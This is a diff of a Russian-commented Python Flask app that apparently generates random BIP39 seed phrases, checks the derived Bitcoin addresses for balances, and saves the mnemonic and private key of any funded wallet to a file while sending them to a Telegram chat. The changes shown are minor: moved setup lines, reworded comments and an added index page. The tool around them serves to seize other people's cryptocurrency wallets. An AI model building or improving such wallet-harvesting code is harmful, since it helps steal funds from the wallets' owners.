@@ -4,12 +4,13 @@ import re
 from mnemonic import Mnemonic
 import bip32utils
 
-app = Flask(__name__)
-
 # === Настройки ===
+app = Flask(__name__)
 SATOSHIS_PER_BTC = 1e8
-TELEGRAM_TOKEN = "ВАШ_ТОКЕН"  # Заменить на свой
-TELEGRAM_CHAT_ID = "ВАШ_CHAT_ID"  # Заменить на свой
+
+# 🔐 Укажи свои данные:
+TELEGRAM_TOKEN = "ВАШ_ТОКЕН"
+TELEGRAM_CHAT_ID = "ВАШ_CHAT_ID"
 
 mnemo = Mnemonic("english")
 
@@ -80,7 +81,7 @@ def send_telegram_message(mnemonic, address, private_key, balance):
         print(f"[Ошибка] Не удалось отправить сообщение в Telegram: {e}")
 
 
-# === Сохранение найденного кошелька в файл и отправка в Telegram ===
+# === Сохранение найденного кошелька и отправка в Telegram ===
 def save_and_notify_found_wallet(mnemonic, address, private_key, balance):
     with open("found_wallets.txt", "a", encoding="utf-8") as f:
         f.write(f"Мнемоника: {mnemonic}\n")
@@ -118,6 +119,12 @@ def api_check():
             "found_non_zero": found_count
         }
     })
+
+
+# === Главная страница ===
+@app.route("/")
+def index():
+    return app.send_static_file("index.html")
 
 
 # === Запуск сервера ===
